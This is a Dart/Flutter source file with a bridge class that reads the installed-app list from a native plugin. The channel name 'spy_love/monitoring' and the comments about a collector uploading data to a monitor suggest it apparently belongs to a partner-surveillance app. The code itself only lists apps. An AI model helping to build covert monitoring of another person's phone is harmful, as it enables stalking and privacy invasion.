import 'package:flutter/services.dart';

/// Reads the list of apps installed on THIS device via the native monitoring
/// plugin. Used for the on-device "all apps" inventory and (once a collector
/// uploads it) to populate the monitor's app list.
///
/// Each entry: `{package, name, system(bool), icon(base64 PNG or null)}`.
class InstalledAppsBridge {
  InstalledAppsBridge._();

  static const _channel = MethodChannel('org.hmg.spy_love/monitoring');

  static Future<List<Map<String, dynamic>>> getInstalledApps({
    bool includeSystem = true,
  }) async {
    try {
      final raw = await _channel.invokeMethod<List<dynamic>>(
        'getInstalledApps',
        {'includeSystem': includeSystem},
      );
      if (raw == null) return const [];
      return raw
          .whereType<Map>()
          .map((e) => Map<String, dynamic>.from(e))
          .toList();
    } on PlatformException {
      return const [];
    } on MissingPluginException {
      return const [];
    }
  }
}
